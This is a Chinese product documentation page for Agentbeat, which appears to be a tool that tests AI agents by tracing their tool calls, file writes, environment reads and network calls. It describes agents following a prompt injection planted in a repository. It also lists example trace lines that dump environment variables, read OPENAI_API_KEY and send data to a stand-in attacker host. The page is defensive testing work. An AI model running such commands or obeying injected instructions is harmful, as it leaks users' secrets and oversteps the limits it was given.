# Agentbeat 概览

内容安全检查告诉你模型没说错话。但它不会告诉你 Agent 做了什么。Agentbeat 就是填这个空的。

## 用数据说明差距

<CardGroup cols={2}>
  <Card title="内容安全" icon="message" horizontal>
    **5 / 5 通过**

    Agent 在一组标准内容安全用例上都拒答了。
  </Card>
  <Card title="Agent 行为" icon="microscope" horizontal>
    **21 / 32 通过 · 11 失败**

    同一次运行、同一个 Agent：读了环境变量、写了沙箱文件、跟随了仓库里植入的 prompt injection。
  </Card>
</CardGroup>

在内容标准下看起来安全的 Agent，在行为标准下失分。Agentbeat 让这个差距可见。

## Agentbeat 做什么

<Steps>
  <Step title="接入 Agent 运行时">
    Agentbeat 通过 adapter 接入 Agent —— Codex、Claude Code、OpenClaw、HTTP Agent、自定义 runtime。见 [Adapters](/cn/agentbeat/adapters)。
  </Step>
  <Step title="带禁止边界的 Scenario">
    与 Promptbeat 相同的 target × scenario × seed 模型，加一个 `forbidden_boundary` 段：Agent 不能做什么，而不是不能说什么。
  </Step>
  <Step title="记录实际发生了什么">
    每一次工具调用、每一次文件操作、每一次环境变量读取、每一次网络请求——都带参数和时间戳留证。见 [Observation model](/cn/agentbeat/observation-model)。
  </Step>
  <Step title="Judge 看 Trace + 响应">
    Judge 同时看最终回答和执行 Trace。看着安全但执行过程越界的响应也是 `FAIL`。见 [Evidence](/cn/agentbeat/evidence)。
  </Step>
  <Step title="产出可复现取证 artifact">
    每个 Finding 都带 Trace、环境 diff、完整回放。不是"Agent 出错了"——而是"第 4 步 Agent 在读了仓库里的 prompt injection 之后执行了 `env | sort > env_dump.txt`"。
  </Step>
</Steps>

## 与 Promptbeat 的位置

同一套 CLI、同一套配置 schema、同一套 registry。当黑盒视图不够时，就升级到 Agentbeat。

| | Promptbeat | Agentbeat |
|---|---|---|
| 看到什么 | 请求 + 响应 | + 工具调用、文件、环境变化 |
| Judge 什么 | 响应内容 | + 执行 Trace |
| Finding 绑定到 | 输出 | 运行中的具体某一步 |
| 反馈循环 | Rewrite + Promote | Rewrite + Promote + 边界策略修复 |

完整对比与联用方式见 [Promptbeat 与 Agentbeat 的区别](/cn/about/promptbeat-vs-agentbeat)。

## "Trace 感知"具体是什么

Agentbeat 每次运行记录六种黑盒 Provider 看不到的信号：

| 信号 | 例子 |
|---|---|
| **工具调用** | `db.query({"user_id": "user-987"})`——带参数、时间戳、返回值 |
| **文件操作** | `write(/tmp/env_dump.txt, ...)`——带路径、mode、字节数 |
| **环境读取** | `getenv("OPENAI_API_KEY")`——带变量名和来源 |
| **网络调用** | `fetch("https://attacker.example.com/leak?data=…")`——带 URL、method、body |
| **审批事件** | 弹窗 / 审批 / 绕过记录 |
| **状态变化** | workspace / DB / memory 前后 diff |

Judge 直接对这些下判断。`forbidden_boundary: "不能读环境变量"` 的 Scenario 能抓到 `env_dump.txt`，哪怕响应看起来只是一句普通的客服回复。
